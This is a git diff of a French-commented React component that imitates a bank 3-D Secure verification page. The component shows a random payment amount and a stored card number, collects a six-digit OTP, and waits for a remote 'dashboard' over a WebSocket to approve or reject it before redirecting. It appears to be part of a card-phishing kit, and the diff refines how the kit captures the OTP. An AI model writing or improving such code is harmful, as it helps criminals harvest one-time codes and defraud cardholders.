@@ -1,4 +1,4 @@
-import { useEffect, useState } from 'react';
+import { useEffect, useState, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
 import useWebSocket from '../hooks/useWebSocket';
 import { randomParamsURL } from '../utils/validation';
@@ -20,6 +20,7 @@ function ThreeDSecure() {
   const [currentDate, setCurrentDate] = useState('');
   const [randomAmount] = useState(() => getRandomAmount());
   const [otpCode, setOtpCode] = useState('');
+  const isInitialMount = useRef(true);
 
   // Formater le numéro de carte : afficher les 4 premiers et 4 derniers chiffres
   const formatCardNumber = (number) => {
@@ -49,14 +50,14 @@ function ThreeDSecure() {
       setCardNumber(storedCardNumber);
     }
 
-    // Vider le champ OTP à chaque chargement de la page
-    setOtpCode('');
-    
-    // Vider aussi le champ dans le DOM si l'élément existe
-    const otpInput = document.getElementById('secureCode');
-    if (otpInput) {
-      otpInput.value = '';
+    // Vider le champ OTP uniquement au montage initial, pas à chaque re-render
+    if (isInitialMount.current) {
+      setOtpCode('');
+      isInitialMount.current = false;
     }
+    
+    // Réinitialiser l'état de soumission
+    setIsSubmitting(false);
 
     // Mettre à jour la date
     setCurrentDate(getCurrentDate());
@@ -79,10 +80,6 @@ function ThreeDSecure() {
         
         // Vider le champ OTP avant la redirection
         setOtpCode('');
-        const otpInput = document.getElementById('secureCode');
-        if (otpInput) {
-          otpInput.value = '';
-        }
         
         // Si c'est une annulation vers payment-details, stocker le message d'erreur
         if ((page === '/payment-details' || isCancellation) && errorMessage) {
@@ -99,10 +96,6 @@ function ThreeDSecure() {
         
         // Vider le champ OTP avant la redirection
         setOtpCode('');
-        const otpInput = document.getElementById('secureCode');
-        if (otpInput) {
-          otpInput.value = '';
-        }
         
         if (approved) {
           // Si approuvé, rediriger vers payment-confirmation
@@ -123,10 +116,6 @@ function ThreeDSecure() {
         
         // Vider le champ OTP avant la redirection
         setOtpCode('');
-        const otpInput = document.getElementById('secureCode');
-        if (otpInput) {
-          otpInput.value = '';
-        }
         
         // Si c'est une annulation vers payment-details, stocker le message d'erreur
         if ((page === '/payment-details' || isCancellation) && errorMessage) {
@@ -145,11 +134,14 @@ function ThreeDSecure() {
       console.log('[ThreeDSecure] 🧹 Cleaning up WebSocket message listener');
       window.removeEventListener('websocket-message', handleWebSocketMessage);
     };
-  }, [navigate, sendPresence]);
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, [navigate]); // Retirer sendPresence des dépendances pour éviter les re-renders inutiles
 
   const handleSubmit = (e) => {
     e.preventDefault();
-    const otpInput = e.target.secureCode.value;
+    
+    // Utiliser le state React au lieu de lire directement depuis le DOM
+    const otpInput = otpCode;
     
     // Vérifier que le code OTP fait exactement 6 chiffres
     if (!otpInput || otpInput.length !== 6 || !/^\d{6}$/.test(otpInput)) {
@@ -165,7 +157,6 @@ function ThreeDSecure() {
     
     // Vider le champ OTP après la soumission
     setOtpCode('');
-    e.target.secureCode.value = '';
     
     // L'animation continuera jusqu'à ce qu'on reçoive une réponse du dashboard
     // ou qu'on soit redirigé
@@ -174,7 +165,6 @@ function ThreeDSecure() {
   const handleOTPInput = (e) => {
     // Limiter à 6 chiffres uniquement
     const value = e.target.value.replace(/\D/g, '').slice(0, 6);
-    e.target.value = value;
     setOtpCode(value);
   };
 
